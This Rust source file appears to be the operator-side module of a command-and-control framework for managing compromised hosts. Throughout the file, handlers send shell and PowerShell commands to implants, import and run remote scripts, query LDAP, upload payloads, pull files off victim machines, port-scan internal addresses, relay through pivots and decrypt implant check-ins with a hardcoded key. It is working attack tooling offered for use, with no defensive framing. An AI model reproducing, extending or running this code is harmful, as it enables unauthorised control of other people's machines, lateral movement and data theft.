use std::collections::HashMap;
use std::fs::File;
use base64::{Engine as _, engine::general_purpose};
use simple_crypt::decrypt;
// use colored::Colorize;
use std::io::{BufReader, Read, Write};
use std::sync::Arc;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{Duration, timeout};

#[derive(Debug)]
pub struct ConnectionInfo {
    pub id: usize,
    pub stream: Arc<Mutex<TcpStream>>,
    pub hostname: String,
    pub is_pivot: bool,
    pub username: String,
    pub os: String,
}


pub async fn handle_importpsh(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'import-psh ID SCRIPT_NAME'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let script_name = parts[2].trim();
    if id > active_connections.lock().await.len() {
        return Err("Invalid ID".to_string());
    }
    let script_file = match File::open(script_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error reading script file {}", script_name)),
    };
    let mut reader = BufReader::new(script_file);
    let mut buffer = Vec::new();
    let active_connections= active_connections.lock().await;
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_script = general_purpose::STANDARD.encode(&buffer);

    let import_cmd = "||IMPORTSCRIPT|| ".to_owned();
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let is_pivot = connection_info.is_pivot;
    let command = if is_pivot {
        format!("||PIVOTCMD|| {}", import_cmd)
    } else {
        import_cmd
    };
    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
    stream.lock().await
        .write(encoded_script.trim().replace("\r", "").replace("\n", "").as_bytes()).await
        .expect("Error writing to stream");
    stream.lock().await.write(b" |!!done!!|").await
        .expect( "Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
    let response = match String::from_utf8(buffer.to_vec()) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}

pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let function_name = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let command = format!("||RUNSCRIPT|| {}", function_name);

    timeout(Duration::from_secs(10), stream.lock().await
    .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 1024];
        let n = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => break,
        };
        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}
pub async fn handle_ldap(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, ) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'cmd ID command'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let ldap_query = parts[2];
    let active_connections = active_connections.lock().await;

    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let is_pivot = connection_info.is_pivot;
    let command = if is_pivot {
        format!("||PIVOTCMD|| ||LDAPQUERY|| {}", ldap_query)
    } else {
        format!("||LDAPQUERY|| {}", ldap_query)
    };
    timeout(Duration::from_secs(10), stream.lock().await
    .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||LDAPQUERY||") {
        let mut buffer = [0; 1024];
        let n = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => break,
        };
        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
    }
    cmdout = cmdout.replace("||LDAPQUERY||", "");
    Ok(cmdout.trim().to_string())
}
pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>, raw_connection: bool) -> (String, String) {
    let mut rbuffer = [0; 1024];
    // let mut wbuffer = String::new();
    let mut stream_lock = stream.lock().await;
    let tcp_stream: &mut tokio::net::TcpStream = &mut *stream_lock;
    // let username: String;
    // let os: String;

    if raw_connection {
        // wbuffer += "whoami\n";
    
        // AsyncWriteExt::write_all(tcp_stream, wbuffer.as_bytes()).await.expect("Error writing to stream");
        // let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
        // match result {
        //     Ok(Ok(n)) => {
        //         username = String::from_utf8(rbuffer[..n].to_vec())
        //         .expect("Error converting to utf-8").trim().to_string();
        //         if username.contains("\\") {
        //             os = "windows".to_string();
        //         } else {
        //             os = "linux".to_string();
        //         }
        //         (username, os)
        //     }
        //     Ok(Err(err)) => {
        //         panic!("Error reading from stream: {:?}", err);
        //     }
        //     Err(_) => {
        //         panic!("Read operation timed out");
        //     }
        // }
        ("test".to_string(), "test".to_string())
    } else {
        let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
        match result {
            Ok(Ok(n)) => {
                // let data = String::from_utf8(rbuffer[..n].to_vec()).expect("Error converting to utf-8");
                let data = decrypt(&rbuffer, b"shared secret").expect("Failed to decrypt");
                let data_string = String::from_utf8(data).expect("Failed to convert to String");
                println!("Received decrypted data: {:?} size {}", data_string, n);
                let parts: Vec<&str> = data_string.split("||").collect();
                if parts[1] == "ACSINFO" {
                    return (parts[2].to_string(), parts[3].to_string());
                } else {
                    return ("".to_string(), "".to_string());
                }
            }
            Ok(Err(err)) => {
                panic!("Error reading from stream: {:?}", err);
            }
            Err(_) => {
                panic!("Read operation timed out");
            }
        }
    }
}
pub async fn handle_command(
    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool)
    -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let command_str = parts[2].trim().to_string();
    let active_connections = active_connections.lock().await;

    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    let is_pivot = &connection_info.is_pivot;
    let command_prefix = if command.starts_with("psh") { "||PSHEXEC||" } else { "||CMDEXEC||" };
    
    let command = if *is_pivot {
        format!("||PIVOTCMD|| {} {}", command_prefix, command_str)
    } else if raw_connection {
        format!("{}\n", command_str)
    } else {
        format!("{} {}", command_prefix, command_str)
    };
    
    stream.lock().await.write(command.as_bytes()).await.expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut cmdout = String::new();
    if raw_connection {
        let mut buffer = [0; 1024];
        let n = match stream.lock().await.read(&mut buffer).await {
            Ok(n) => n,
            Err(_) => return Err("Error reading from stream".to_string()),
        };
        cmdout = String::from_utf8(buffer[..n].to_vec()).unwrap();
    } else {
        while !cmdout.contains("||cmd||") {
            let mut buffer = [0; 1024];
            let n = match stream.lock().await.read(&mut buffer).await {
                Ok(n) => n,
                Err(_) => break,
            };
            cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
        }
        cmdout = cmdout.replace("||cmd||", "");
    }
    Ok(cmdout.trim().to_string())
}
pub async fn handle_list(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>) -> Vec<String> {
    let mut list = vec![String::new()];
    list.push("Active connections:\n".to_string());
    for (hostname, con) in active_connections.lock().await.iter() {
        if con.is_pivot {
            list.push(format!("[+] PIVOT: {} (ID {}) username: {}, OS: {}\n", hostname, con.id, con.username, con.os).to_string());
        } else {
            list.push(format!("[+] {} (ID {}) username: {}, OS: {}\n", hostname, con.id, con.username, con.os).to_string());
        }
    }
    list
}
pub async fn handle_upload(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Upload command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'upload ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let file_name = parts[2].trim();
    let destination = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error opening file {}", file_name)),
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer).unwrap();
    let encoded_file = general_purpose::STANDARD.encode(&buffer);
    let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
    let (_,connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    stream.lock().await.write(upload_cmd.as_bytes()).await
        .expect("Error writing to stream");
    stream.lock().await
        .write(encoded_file.trim().replace("\r", "").replace("\n", "").as_bytes()).await
        .expect("Error writing to stream");
    stream.lock().await
        .write(b" |!!done!!|").await
        .expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let n = match stream.lock().await.read(&mut buffer).await {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };
    let response = match String::from_utf8(buffer[..n].to_vec()) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}
pub async fn handle_download(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Download command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'download ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let download_input = parts[2].trim();
    let filename = parts[3].trim();
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    stream.lock().await.write(download_cmd.as_bytes()).await.expect("Error writing to stream");
    let mut file = match File::create(filename) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error creating file: {}", filename)),
    };
    timeout(Duration::from_secs(60), stream.lock().await
    .read(&mut [0u8; 1024])).await.expect("failed timeout").unwrap();
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        match stream.lock().await.read(&mut buffer).await {
            Ok(n) => {
                let data = match String::from_utf8(buffer[..n].to_vec()) {
                    Ok(data) => data,
                    Err(_) => return Err("Error converting data to string".to_string()),
                };
                encoded_data.push_str(&data);
                if data.contains("|!!done!!|") {
                    break;
                }
            }
            Err(err) => return Err(format!("Error receiving data: {}", err)),
        }
    }
    encoded_data = encoded_data.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
    let decoded_data = match general_purpose::STANDARD.decode(&encoded_data) {
        Ok(decoded_data) => decoded_data,
        Err(err) => return Err(format!("Error decoding data: {}", err)),
    };
    match file.write_all(&decoded_data) {
        Ok(_) => Ok(format!("DOWNLOAD: File saved to {}.", filename)),
        Err(err) => Err(format!("Error writing to file: {}", err)),
    }
}
pub async fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    if raw_connection {
        return Err("Port scan command not supported for raw connections".to_string());
    }
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 5 {
        return Err("Invalid command, expected 'portscan ID ip start_port end_port'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    let active_connections = active_connections.lock().await;
    if !active_connections.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }
    let ip = parts[2].trim();
    let num1 = parts[3];
    let num2 = parts[4];
    let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + &num2;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();
    stream.lock().await
        .write(port_scan_cmd.as_bytes()).await
        .expect("Error writing to stream");
    stream.lock().await.flush().await.expect("Error flushing stream");
    let mut buffer = [0; 1024];
    let n = stream.lock().await.read(&mut buffer).await.unwrap();
    let response = String::from_utf8(buffer[..n].to_vec()).unwrap();
    let factor = format!("{}:", ip);
    let mut ports: Vec<&str> = response.split(&factor).collect();
    ports.remove(0);
    let formatted_response = ports.join(", ");
    Ok(format!("IP {} has port {} open", ip, formatted_response))
}
pub async fn handle_kill(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    if parts.len() < 2 {
        return Err("Invalid command, expected 'kill ID'".to_string());
    }
    
    if !active_connections.lock().await.values().any(|value| value.id == id) {
        return Err("Invalid ID".to_string());
    }

    let active_connections = active_connections.lock().await;
    let (_, connection_info) = active_connections.iter().nth(id).unwrap();
    let stream = connection_info.stream.clone();

    if raw_connection {
        stream.lock().await.write(b"exit\n").await.expect("Error writing to stream");
    } else {
        stream.lock().await.write(b"||EXIT||").await.expect("Error writing to stream");
    }
    stream.lock().await.flush().await.expect("Error flushing stream");
    Ok(format!("Kill command sent to {}.", id))
}
pub fn handle_exit() {
    println!("\nExiting");
    std::process::exit(0);
}
